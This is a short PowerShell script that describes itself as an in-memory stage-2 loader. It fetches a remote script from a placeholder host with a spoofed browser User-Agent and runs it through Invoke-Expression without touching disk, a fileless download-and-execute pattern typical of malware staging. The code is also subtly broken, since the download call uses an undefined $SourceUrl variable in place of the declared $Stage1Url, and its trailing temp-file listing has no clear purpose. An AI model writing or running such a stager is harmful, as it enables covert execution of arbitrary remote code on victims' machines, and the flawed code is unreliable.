<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://contoso.com:80/stage2.ps1',
    [int]$StageTimeout = 151
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$StageScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($StageScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $StageScript.Length)
Invoke-Expression $StageScript

$ProgressPreference = "SilentlyContinue"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
